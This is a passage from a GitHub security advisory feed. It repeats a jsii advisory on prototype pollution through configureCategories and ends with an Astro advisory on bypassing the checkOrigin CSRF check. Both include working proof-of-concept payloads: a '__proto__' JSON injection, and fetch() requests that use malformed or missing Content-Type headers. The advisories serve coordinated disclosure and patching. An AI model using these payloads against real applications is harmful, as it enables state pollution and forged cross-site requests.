<p>The function <code>jsii.configureCategories()</code> is used to configure the severity (error, warning, etc.) of various jsii diagnostics.</p>
</blockquote>
<p><strong>Impacted versions: &lt;=5.7.2, &lt;=5.6.3, &lt;=5.5.14, &lt;=5.4.45</strong> </p>
<p><strong>Example:</strong></p>
<pre><code class="language-js">const jsii = require('jsii');

// prints 'undefined'
console.log(JSON.stringify({}.category))

// calling 'configureCategories' with user input
jsii.configureCategories(JSON.parse('{"__proto__": "user-input"}'))

// from this point onwards, every single object literal in the program
// will contain the 'category' key, with user controlled value
console.log(JSON.stringify({}.category)) // prints 'user-input'


// this can affect the execution of the main program in case it also makes 
// use of an object key called 'category'. for example, if the main programs 
// happens to have code like this:

const x = {} // some object in the main program (not necessarily empty)

if (x.category) {
  // this block will always be executed, effectively 
  // changing the behavior of the main program.
  console.log('Do something')
} else {
  console.log('Do something else')
}
</code></pre>
<p>For more information about javascript prototype pollution, see [1].</p>
<h2 id="patches">Patches</h2>
<p>A patch is included in versions <a href="https://github.com/aws/jsii-compiler/releases/tag/v5.7.3">5.7.3</a>, <a href="https://github.com/aws/jsii-compiler/releases/tag/v5.6.4">5.6.4</a>, <a href="https://github.com/aws/jsii-compiler/releases/tag/v5.5.15">5.5.15</a>, <a href="https://github.com/aws/jsii-compiler/releases/tag/v5.4.46">5.4.46</a></p>
<h2 id="workarounds">Workarounds</h2>
<p>Sanitize user input to configureCategories() by stripping the <strong>proto</strong> property if detected.</p>
<h2 id="references">References</h2>
<p>If you have any questions or comments about this advisory, we ask that you contact AWS/Amazon Security via our issue reporting page [2] or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
<p>[1] <a href="https://learn.snyk.io/lesson/prototype-pollution/">https://learn.snyk.io/lesson/prototype-pollution/</a></p>
<p>[2] <a href="https://aws.amazon.com/security/vulnerability-reporting">https://aws.amazon.com/security/issue-reporting</a></p>
<h2 id="credits">Credits</h2>
<p>We would like to thank <em>Tariq Hawis</em> for collaborating on this issue through the coordinated vulnerability disclosure process.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/aws/jsii-compiler/security/advisories/GHSA-m56h-5xx3-2jc2">https://github.com/aws/jsii-compiler/security/advisories/GHSA-m56h-5xx3-2jc2</a></li>
<li><a href="https://github.com/aws/jsii-compiler/releases/tag/v5.4.46">https://github.com/aws/jsii-compiler/releases/tag/v5.4.46</a></li>
<li><a href="https://github.com/aws/jsii-compiler/releases/tag/v5.5.15">https://github.com/aws/jsii-compiler/releases/tag/v5.5.15</a></li>
<li><a href="https://github.com/aws/jsii-compiler/releases/tag/v5.6.4">https://github.com/aws/jsii-compiler/releases/tag/v5.6.4</a></li>
<li><a href="https://github.com/aws/jsii-compiler/releases/tag/v5.7.3">https://github.com/aws/jsii-compiler/releases/tag/v5.7.3</a></li>
<li><a href="https://github.com/advisories/GHSA-m56h-5xx3-2jc2">https://github.com/advisories/GHSA-m56h-5xx3-2jc2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m56h-5xx3-2jc2</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-12-18T15:50:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jsii] Prototype pollution in jsii.configureCategories]]></title>
        <id>https://github.com/advisories/GHSA-m56h-5xx3-2jc2</id>
        <link href="https://github.com/advisories/GHSA-m56h-5xx3-2jc2"/>
        <updated>2025-01-07T15:12:21.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>jsii</code> is a TypeScript to JavaScript compiler that also extracts an interface definition manifest to generate RPC stubs in various programming languages. jsii is typically used as a command-line tool, but it can also be loaded as a library.
When loaded as a library into a larger application, prototype pollution may happen if untrusted user input is passed to the library. When used as a command line-tool, this pollution cannot occur.</p>
<h2 id="impact">Impact</h2>
<p>You may be impacted if you have written an application that loads jsii as a library, and passes untrusted user input into the <code>jsii.configureCategories()</code> function. In that case, a user can craft input in such a way that, following the invocation, a field named "category" with a user-controlled value is added to the JavaScript Object prototype. This will cause every object in the program (both new and existing) to have a field named "category", even if it shouldn't. </p>
<p><strong>This will not affect jsii itself, but it might affect the application you have loaded jsii into.</strong></p>
<blockquote>
<p>The function <code>jsii.configureCategories()</code> is used to configure the severity (error, warning, etc.) of various jsii diagnostics.</p>
</blockquote>
<p><strong>Impacted versions: &lt;=5.7.2, &lt;=5.6.3, &lt;=5.5.14, &lt;=5.4.45</strong> </p>
<p><strong>Example:</strong></p>
<pre><code class="language-js">const jsii = require('jsii');

// prints 'undefined'
console.log(JSON.stringify({}.category))

// calling 'configureCategories' with user input
jsii.configureCategories(JSON.parse('{"__proto__": "user-input"}'))

// from this point onwards, every single object literal in the program
// will contain the 'category' key, with user controlled value
console.log(JSON.stringify({}.category)) // prints 'user-input'


// this can affect the execution of the main program in case it also makes 
// use of an object key called 'category'. for example, if the main programs 
// happens to have code like this:

const x = {} // some object in the main program (not necessarily empty)

if (x.category) {
  // this block will always be executed, effectively 
  // changing the behavior of the main program.
  console.log('Do something')
} else {
  console.log('Do something else')
}
</code></pre>
<p>For more information about javascript prototype pollution, see [1].</p>
<h2 id="patches">Patches</h2>
<p>A patch is included in versions <a href="https://github.com/aws/jsii-compiler/releases/tag/v5.7.3">5.7.3</a>, <a href="https://github.com/aws/jsii-compiler/releases/tag/v5.6.4">5.6.4</a>, <a href="https://github.com/aws/jsii-compiler/releases/tag/v5.5.15">5.5.15</a>, <a href="https://github.com/aws/jsii-compiler/releases/tag/v5.4.46">5.4.46</a></p>
<h2 id="workarounds">Workarounds</h2>
<p>Sanitize user input to configureCategories() by stripping the <strong>proto</strong> property if detected.</p>
<h2 id="references">References</h2>
<p>If you have any questions or comments about this advisory, we ask that you contact AWS/Amazon Security via our issue reporting page [2] or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
<p>[1] <a href="https://learn.snyk.io/lesson/prototype-pollution/">https://learn.snyk.io/lesson/prototype-pollution/</a></p>
<p>[2] <a href="https://aws.amazon.com/security/vulnerability-reporting">https://aws.amazon.com/security/issue-reporting</a></p>
<h2 id="credits">Credits</h2>
<p>We would like to thank <em>Tariq Hawis</em> for collaborating on this issue through the coordinated vulnerability disclosure process.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/aws/jsii-compiler/security/advisories/GHSA-m56h-5xx3-2jc2">https://github.com/aws/jsii-compiler/security/advisories/GHSA-m56h-5xx3-2jc2</a></li>
<li><a href="https://github.com/aws/jsii-compiler/releases/tag/v5.4.46">https://github.com/aws/jsii-compiler/releases/tag/v5.4.46</a></li>
<li><a href="https://github.com/aws/jsii-compiler/releases/tag/v5.5.15">https://github.com/aws/jsii-compiler/releases/tag/v5.5.15</a></li>
<li><a href="https://github.com/aws/jsii-compiler/releases/tag/v5.6.4">https://github.com/aws/jsii-compiler/releases/tag/v5.6.4</a></li>
<li><a href="https://github.com/aws/jsii-compiler/releases/tag/v5.7.3">https://github.com/aws/jsii-compiler/releases/tag/v5.7.3</a></li>
<li><a href="https://github.com/advisories/GHSA-m56h-5xx3-2jc2">https://github.com/advisories/GHSA-m56h-5xx3-2jc2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m56h-5xx3-2jc2</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-12-18T15:50:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jsii] Prototype pollution in jsii.configureCategories]]></title>
        <id>https://github.com/advisories/GHSA-m56h-5xx3-2jc2</id>
        <link href="https://github.com/advisories/GHSA-m56h-5xx3-2jc2"/>
        <updated>2025-01-07T15:12:21.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>jsii</code> is a TypeScript to JavaScript compiler that also extracts an interface definition manifest to generate RPC stubs in various programming languages. jsii is typically used as a command-line tool, but it can also be loaded as a library.
When loaded as a library into a larger application, prototype pollution may happen if untrusted user input is passed to the library. When used as a command line-tool, this pollution cannot occur.</p>
<h2 id="impact">Impact</h2>
<p>You may be impacted if you have written an application that loads jsii as a library, and passes untrusted user input into the <code>jsii.configureCategories()</code> function. In that case, a user can craft input in such a way that, following the invocation, a field named "category" with a user-controlled value is added to the JavaScript Object prototype. This will cause every object in the program (both new and existing) to have a field named "category", even if it shouldn't. </p>
<p><strong>This will not affect jsii itself, but it might affect the application you have loaded jsii into.</strong></p>
<blockquote>
<p>The function <code>jsii.configureCategories()</code> is used to configure the severity (error, warning, etc.) of various jsii diagnostics.</p>
</blockquote>
<p><strong>Impacted versions: &lt;=5.7.2, &lt;=5.6.3, &lt;=5.5.14, &lt;=5.4.45</strong> </p>
<p><strong>Example:</strong></p>
<pre><code class="language-js">const jsii = require('jsii');

// prints 'undefined'
console.log(JSON.stringify({}.category))

// calling 'configureCategories' with user input
jsii.configureCategories(JSON.parse('{"__proto__": "user-input"}'))

// from this point onwards, every single object literal in the program
// will contain the 'category' key, with user controlled value
console.log(JSON.stringify({}.category)) // prints 'user-input'


// this can affect the execution of the main program in case it also makes 
// use of an object key called 'category'. for example, if the main programs 
// happens to have code like this:

const x = {} // some object in the main program (not necessarily empty)

if (x.category) {
  // this block will always be executed, effectively 
  // changing the behavior of the main program.
  console.log('Do something')
} else {
  console.log('Do something else')
}
</code></pre>
<p>For more information about javascript prototype pollution, see [1].</p>
<h2 id="patches">Patches</h2>
<p>A patch is included in versions <a href="https://github.com/aws/jsii-compiler/releases/tag/v5.7.3">5.7.3</a>, <a href="https://github.com/aws/jsii-compiler/releases/tag/v5.6.4">5.6.4</a>, <a href="https://github.com/aws/jsii-compiler/releases/tag/v5.5.15">5.5.15</a>, <a href="https://github.com/aws/jsii-compiler/releases/tag/v5.4.46">5.4.46</a></p>
<h2 id="workarounds">Workarounds</h2>
<p>Sanitize user input to configureCategories() by stripping the <strong>proto</strong> property if detected.</p>
<h2 id="references">References</h2>
<p>If you have any questions or comments about this advisory, we ask that you contact AWS/Amazon Security via our issue reporting page [2] or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
<p>[1] <a href="https://learn.snyk.io/lesson/prototype-pollution/">https://learn.snyk.io/lesson/prototype-pollution/</a></p>
<p>[2] <a href="https://aws.amazon.com/security/vulnerability-reporting">https://aws.amazon.com/security/issue-reporting</a></p>
<h2 id="credits">Credits</h2>
<p>We would like to thank <em>Tariq Hawis</em> for collaborating on this issue through the coordinated vulnerability disclosure process.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/aws/jsii-compiler/security/advisories/GHSA-m56h-5xx3-2jc2">https://github.com/aws/jsii-compiler/security/advisories/GHSA-m56h-5xx3-2jc2</a></li>
<li><a href="https://github.com/aws/jsii-compiler/releases/tag/v5.4.46">https://github.com/aws/jsii-compiler/releases/tag/v5.4.46</a></li>
<li><a href="https://github.com/aws/jsii-compiler/releases/tag/v5.5.15">https://github.com/aws/jsii-compiler/releases/tag/v5.5.15</a></li>
<li><a href="https://github.com/aws/jsii-compiler/releases/tag/v5.6.4">https://github.com/aws/jsii-compiler/releases/tag/v5.6.4</a></li>
<li><a href="https://github.com/aws/jsii-compiler/releases/tag/v5.7.3">https://github.com/aws/jsii-compiler/releases/tag/v5.7.3</a></li>
<li><a href="https://github.com/advisories/GHSA-m56h-5xx3-2jc2">https://github.com/advisories/GHSA-m56h-5xx3-2jc2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m56h-5xx3-2jc2</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-12-18T15:50:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[astro] Atro CSRF Middleware Bypass (security.checkOrigin)]]></title>
        <id>https://github.com/advisories/GHSA-c4pw-33h3-35xw</id>
        <link href="https://github.com/advisories/GHSA-c4pw-33h3-35xw"/>
        <updated>2024-12-18T21:52:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A bug in Astro’s CSRF-protection middleware allows requests to bypass CSRF checks.</p>
<h3 id="details">Details</h3>
<p>When the <code>security.checkOrigin</code> configuration option is set to <code>true</code>, Astro middleware will perform a CSRF check. (Source code: <a href="https://github.com/withastro/astro/blob/6031962ab5f56457de986eb82bd24807e926ba1b/packages/astro/src/core/app/middlewares.ts">https://github.com/withastro/astro/blob/6031962ab5f56457de986eb82bd24807e926ba1b/packages/astro/src/core/app/middlewares.ts</a>)</p>
<p>For example, with the following Astro configuration:</p>
<pre><code class="language-js">// astro.config.mjs
import { defineConfig } from 'astro/config';
import node from '@astrojs/node';

export default defineConfig({
    output: 'server',
    security: { checkOrigin: true },
    adapter: node({ mode: 'standalone' }),
});
</code></pre>
<p>A request like the following would be blocked if made from a different origin:</p>
<pre><code class="language-js">// fetch API or &lt;form action="https://test.example.com/" method="POST"&gt;
fetch('https://test.example.com/', {
    method: 'POST',
    credentials: 'include',
    body: 'a=b',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
});
// =&gt; Cross-site POST form submissions are forbidden
</code></pre>
<p>However, a vulnerability exists that can bypass this security.</p>
<h4 id="pattern-1-requests-with-a-semicolon-after-the-content-type">Pattern 1: Requests with a semicolon after the <code>Content-Type</code></h4>
<p>A semicolon-delimited parameter is allowed after the type in <code>Content-Type</code>.</p>
<p>Web browsers will treat a <code>Content-Type</code> such as <code>application/x-www-form-urlencoded; abc</code> as a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests">simple request</a> and will not perform preflight validation. In this case, CSRF is not blocked as expected.</p>
<pre><code class="language-js">fetch('https://test.example.com', {
    method: 'POST',
    credentials: 'include',
    body: 'test',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded; abc' },
});
// =&gt; Server-side functions are executed (Response Code 200).
</code></pre>
<h4 id="pattern-2-request-without-content-type-header">Pattern 2: Request without <code>Content-Type</code> header</h4>
<p>The <code>Content-Type</code> header is not required for a request. The following examples are sent without a <code>Content-Type</code> header, resulting in CSRF.</p>
<pre><code class="language-js">// Pattern 2.1 Request without body
fetch('http://test.example.com', { method: 'POST', credentials: 'include' });

// Pattern 2.2 Blob object without type
fetch('https://test.example.com', {
    method: 'POST',
    credentials: 'include',
    body: new Blob(['a=b'], {}),
});
</code></pre>
<h3 id="impact">Impact</h3>
<p>Bypass CSRF protection implemented with CSRF middleware.</p>
<blockquote>
<p>[!Note]
Even with <code>credentials: 'include'</code>, browsers may not send cookies due to third-party cookie blocking. This feature depends on the browser version and settings, and is for privacy protection, not as a CSRF measure.</p>
</blockquote>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/withastro/astro/security/advisories/GHSA-c4pw-33h3-35xw">https://github.com/withastro/astro/security/advisories/GHSA-c4pw-33h3-35xw</a></li>
<li><a href="https://github.com/withastro/astro/commit/e7d14c374b9d45e27089994a4eb72186d05514de">https://github.com/withastro/astro/commit/e7d14c374b9d45e27089994a4eb72186d05514de</a></li>
<li><a href="https://github.com/withastro/astro/blob/6031962ab5f56457de986eb82bd24807e926ba1b/packages/astro/src/core/app/middlewares.ts">https://github.com/withastro/astro/blob/6031962ab5f56457de986eb82bd24807e926ba1b/packages/astro/src/core/app/middlewares.ts</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56140">https://nvd.nist.gov/vuln/detail/CVE-2024-56140</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests">https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests</a></li>
<li><a href="https://github.com/advisories/GHSA-c4pw-33h3-35xw">https://github.com/advisories/GHSA-c4pw-33h3-35xw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c4pw-33h3-35xw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-18T15:02:37.000Z</published>
    </entry>
</feed>